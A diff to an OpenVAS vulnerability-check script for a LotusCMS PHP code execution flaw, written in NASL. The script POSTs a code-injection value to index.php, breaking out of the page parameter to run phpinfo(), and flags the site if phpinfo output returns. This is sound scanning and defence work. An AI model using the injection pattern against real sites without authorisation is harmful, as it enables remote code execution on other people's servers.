@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_lotuscms_php_code_exec_2011.nasl 3062 2016-04-14 11:03:39Z benallard $
+# $Id: gb_lotuscms_php_code_exec_2011.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # LotusCMS PHP Code Execution Vulnerabilities
 #
@@ -33,21 +33,17 @@ An attacker can exploit this vulnerability to execute arbitrary PHP code.
 LotusCMS 3.0.3 and 3.0.5 are vulnerable; other versions may also be
 affected.";
 
-
 if (description)
 {
  script_id(103444);
- script_version ("$Revision: 3062 $");
+ script_version ("$Revision: 5715 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("LotusCMS PHP Code Execution Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2011-21/");
  script_xref(name : "URL" , value : "http://www.lotuscms.org/");
-
- script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-03-07 11:02:50 +0100 (Wed, 07 Mar 2012)");
- script_summary("Determine if it is possible to execute php code");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -60,48 +56,42 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
+foreach dir( make_list_unique( "/lcms", "/cms", "/lotuscms", cgi_dirs( port:port ) ) ) {
 
-host = get_host_name();
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-dirs = make_list("/lcms","/cms","/lotuscms",cgi_dirs());
+  if( buf =~ "Powered by.*LotusCMS" || 'content="LotusCMS"' >< buf ) {
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/index.php"); 
+    p = eregmatch( pattern:"index.php\?page=([a-zA-Z0-9]+)", string:buf );
+    if( isnull( p[1] ) ) continue;
 
-  if(buf = http_vuln_check(port:port, url:url,pattern:'(Powered by.*LotusCMS|content="LotusCMS")')) {
-
-    p = eregmatch(pattern:"index.php\?page=([a-zA-Z0-9]+)", string:buf);
-    if(isnull(p[1]))exit(0);
-
+    host = http_host_name( port:port );
     page = p[1];
     ex = "page=" + page + "');phpinfo();#";
     len = strlen(ex);
 
-    req = string("POST ",dir,"/index.php HTTP/1.1\r\n",
+    req = string("POST ",url," HTTP/1.1\r\n",
                  "Host: ",host,"\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ",len,"\r\n",
                  "\r\n",
                   ex,
                  "\r\n\r\n");
+    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-    if("<title>phpinfo()" >< result) {
-      security_message(port:port);
-      exit(0);
+    if( "<title>phpinfo()" >< res ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
-
   }
 }
 
-exit(0);
+exit( 99 );
